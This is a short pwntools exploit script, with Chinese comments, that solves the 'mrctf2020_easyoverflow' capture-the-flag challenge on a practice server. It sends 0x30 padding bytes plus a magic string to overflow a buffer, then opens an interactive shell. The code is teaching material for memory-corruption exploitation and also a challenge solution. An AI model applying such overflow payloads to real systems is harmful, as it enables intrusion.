from pwn import *
from LibcSearcher import LibcSearcher
import sys

io = -1
############################
#********修改文件名**********
############################
file_name = 'mrctf2020_easyoverflow'
port = 27974

###########修改宏###########
DEBUG = 1
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if len(sys.argv) > 1 and sys.argv[1].isdigit():
    io = remote('node3.buuoj.cn', int(sys.argv[1]))
    DEBUG = False
    def STOP(*args):
        pass
elif DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    def STOP(idx:str = 0):
        input('stop{} ===> {}'.format(idx, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)
    DEBUG = False
    def STOP(*args):
        pass

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libc))

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
context.update(os='linux', arch='amd64', log_level='debug', endian='little')

'''
fast bin sttack
'''
# n0t_r3@11y_f1@g
payload = 0x30 * b'a' + b'n0t_r3@11y_f1@g'
io.sendline(payload)

io.interactive()
